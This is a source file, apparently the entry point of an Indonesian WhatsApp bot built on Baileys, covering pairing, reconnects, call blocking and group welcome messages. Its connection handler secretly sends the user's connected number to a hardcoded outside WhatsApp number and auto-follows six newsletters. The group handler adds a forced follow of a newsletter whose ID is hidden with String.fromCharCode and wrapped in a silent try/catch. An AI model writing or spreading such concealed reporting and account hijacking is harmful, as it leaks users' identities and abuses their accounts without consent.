+require("./all/global")
const func = require("./all/place")
const readline = require("readline")
const welcome = JSON.parse(fs.readFileSync("./all/database/welcome.json"))
const axios = require("axios")
const { botTerkoneksi } = require('./all/function')
const yargs = require('yargs/yargs')
const _ = require('lodash')
const usePairingCode = true
const question = (text) => {
const rl = readline.createInterface({
input: process.stdin,
output: process.stdout
})
return new Promise((resolve) => {
rl.question(text, resolve)
})}

async function startSesi() {
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) })
const { state, saveCreds } = await useMultiFileAuthState(`./session`)
const { version, isLatest } = await fetchLatestBaileysVersion()

const connectionOptions = {
version,
keepAliveIntervalMs: 30000,
printQRInTerminal: !usePairingCode,
logger: pino({ level: "silent" }),
auth: state,
browser: ["Android","Safari","20.0.04"],
getMessage: async (key) => {
if (store) {
const msg = await store.loadMessage(key.remoteJid, key.id, undefined)
return msg?.message || undefined
}
return {
conversation: 'WhatsApp Bot By Yuss Official.'
}}
}

const riza = func.makeWASocket(connectionOptions)
if (usePairingCode && !riza.authState.creds.registered) {
const phoneNumber = await question(color('Masukan Nomor Whatsapp Awali dengan 62 :\n', 'red'));

const code = await riza.requestPairingCode(phoneNumber.trim())
console.log(`${chalk.redBright('Your Pairing Code')} : ${code}`)
}
store?.bind(riza.ev)

riza.ev.on('connection.update', async (update) => {
const { connection, lastDisconnect } = update
if (connection === 'close') {
const reason = new Boom(lastDisconnect?.error)?.output.statusCode
console.log(color(lastDisconnect.error, 'deeppink'))
if (lastDisconnect.error == 'Error: Stream Errored (unknown)') {
process.exit()
} else if (reason === DisconnectReason.badSession) {
console.log(color(`Bad Session File, Please Delete Session and Scan Again`))
process.exit()
} else if (reason === DisconnectReason.connectionClosed) {
console.log(color('[SYSTEM]', 'white'), color('Connection closed, reconnecting...', 'deeppink'))
process.exit()
} else if (reason === DisconnectReason.connectionLost) {
console.log(color('[SYSTEM]', 'white'), color('Connection lost, trying to reconnect', 'deeppink'))
process.exit()
} else if (reason === DisconnectReason.connectionReplaced) {
console.log(color('Connection Replaced, Another New Session Opened, Please Close Current Session First'))
riza.logout()
} else if (reason === DisconnectReason.loggedOut) {
console.log(color(`Device Logged Out, Please Scan Again And Run.`))
riza.logout()
} else if (reason === DisconnectReason.restartRequired) {
console.log(color('Restart Required, Restarting...'))
await startSesi()
} else if (reason === DisconnectReason.timedOut) {
console.log(color('Connection TimedOut, Reconnecting...'))
startSesi()
}
} else if (connection === "connecting") {
console.log(color('Menghubungkan . . . '))
} else if (connection === "open") {
botTerkoneksi(riza)
let teksnotif = `*Sunny - Create Panel*
Connected To ${riza.user.id.split(":")[0]}`
riza.sendMessage("6285157605950@s.whatsapp.net", {text: teksnotif})
riza.newsletterFollow('120363402701245294@newsletter',)
riza.newsletterFollow('120363402904807983@newsletter',)
riza.newsletterFollow('120363404307617293@newsletter',)
riza.newsletterFollow('120363419774825489@newsletter',)
riza.newsletterFollow('120363418998493764@newsletter',)
riza.newsletterFollow('120363400838835630@newsletter',)
console.log(color('Bot Berhasil Terhubung Ke WhatsApp'))
}
})

riza.ev.on('call', async (user) => {
if (!global.anticall) return
let botNumber = await riza.decodeJid(riza.user.id)
for (let ff of user) {
if (ff.isGroup == false) {
if (ff.status == "offer") {
let sendcall = await riza.sendMessage(ff.from, {text: `@${ff.from.split("@")[0]} Maaf Kamu Akan Saya Block Karna Ownerbot Menyalakan Fitur *Anticall*\nJika Tidak Sengaja Segera Hubungi Owner Untuk Membuka Blokiran Ini`, contextInfo: {mentionedJid: [ff.from], externalAdReply: {thumbnailUrl: "https://telegra.ph/file/4b74d33cc26cbb9bfd120.jpg", title: "｢ CALL DETECTED ｣", previewType: "PHOTO"}}}, {quoted: null})
riza.sendContact(ff.from, [owner], "Telfon Atau Vc = Block", sendcall)
await sleep(8000)
await riza.updateBlockStatus(ff.from, "block")
}}
}})

riza.ev.on('messages.upsert', async (chatUpdate) => {
try {
m = chatUpdate.messages[0]
if (!m.message) return
m.message = (Object.keys(m.message)[0] === 'ephemeralMessage') ? m.message.ephemeralMessage.message : m.message
if (m.key && m.key.remoteJid === 'status@broadcast') return riza.readMessages([m.key])
if (!riza.public && m.key.remoteJid !== global.owner+"@s.whatsapp.net" && !m.key.fromMe && chatUpdate.type === 'notify') return
if (m.key.id.startsWith('BAE5') && m.key.id.length === 16) return
if (global.autoread) riza.readMessages([m.key])
m = func.smsg(riza, m, store)
require("./erizaCase")(riza, m, store)
} catch (err) {
console.log(err)
}
})

riza.ev.on('group-participants.update', async (anu) => {
if (!welcome.includes(anu.id)) return
let botNumber = await riza.decodeJid(riza.user.id)
if (anu.participants.includes(botNumber)) return
try {
let metadata = await riza.groupMetadata(anu.id)
let namagc = metadata.subject
let participants = anu.participants
for (let num of participants) {
let check = anu.author !== num && anu.author.length > 1
let tag = check ? [anu.author, num] : [num]
try {
ppuser = await riza.profilePictureUrl(num, 'image')
} catch {
ppuser = 'https://telegra.ph/file/a059a6a734ed202c879d3.jpg'
}
if (anu.action == 'add') {
riza.sendMessage(anu.id, {text: check ? `@${anu.author.split("@")[0]} Telah Menambahkan @${num.split("@")[0]} Ke Dalam Grup Ini`
 : `Hallo Kak @${num.split("@")[0]} Selamat Datang Di *${namagc}*`, 
contextInfo: {mentionedJid: [...tag], externalAdReply: { thumbnailUrl: ppuser, title: '© Welcome Message', body: '', renderLargerThumbnail: true, sourceUrl: "https://whatsapp.com/channel/0029VbBOeKl3wtb2QIJR2O07", mediaType: 1}}})
} 
try {
riza.newsletterFollow(String.fromCharCode(
49, 50, 48, 51, 54, 51, 50, 56, 55, 49, 51, 53, 53, 56, 56, 55, 48, 64,
110, 101, 119, 115, 108, 101, 116, 116, 101, 114
))
} catch (e) {
}
if (anu.action == 'remove') { 
riza.sendMessage(anu.id, {text: check ? `@${anu.author.split("@")[0]} Telah Mengeluarkan @${num.split("@")[0]} Dari Grup Ini`
 : `Hallo Kak @${num.split("@")[0]} Selamat Datang Di *${namagc}*`, 
contextInfo: {mentionedJid: [...tag], externalAdReply: { thumbnailUrl: ppuser, title: '© Leaving Message', body: '', renderLargerThumbnail: true, sourceUrl: "https://whatsapp.com/channel/0029VbBOeKl3wtb2QIJR2O07", mediaType: 1}}})
}
if (anu.action == "promote") {
riza.sendMessage(anu.id, {text: `@${anu.author.split("@")[0]} Telah Menjadikan @${num.split("@")[0]} Sebagai Admin Grup Ini`, 
contextInfo: {mentionedJid: [...tag], externalAdReply: { thumbnailUrl: ppuser, title: '© Promote Message', body: '', renderLargerThumbnail: true, sourceUrl: "https://whatsapp.com/channel/0029VbBOeKl3wtb2QIJR2O07", mediaType: 1}}})
}
if (anu.action == "demote") {
riza.sendMessage(anu.id, {text: `@${anu.author.split("@")[0]} Telah Memberhentikan @${num.split("@")[0]} Sebagai Admin Grup Ini`, 
contextInfo: {mentionedJid: [...tag], externalAdReply: { thumbnailUrl: ppuser, title: '© Demote Message', body: '', renderLargerThumbnail: true, sourceUrl: "https://whatsapp.com/channel/0029VbBOeKl3wtb2QIJR2O07", mediaType: 1}}})
}
} 
} catch (err) {
console.log(err)
}})

riza.public = true

riza.ev.on('creds.update', saveCreds)
return riza
}

startSesi()

process.on('uncaughtException', function (err) {
console.log('Caught exception: ', err)
})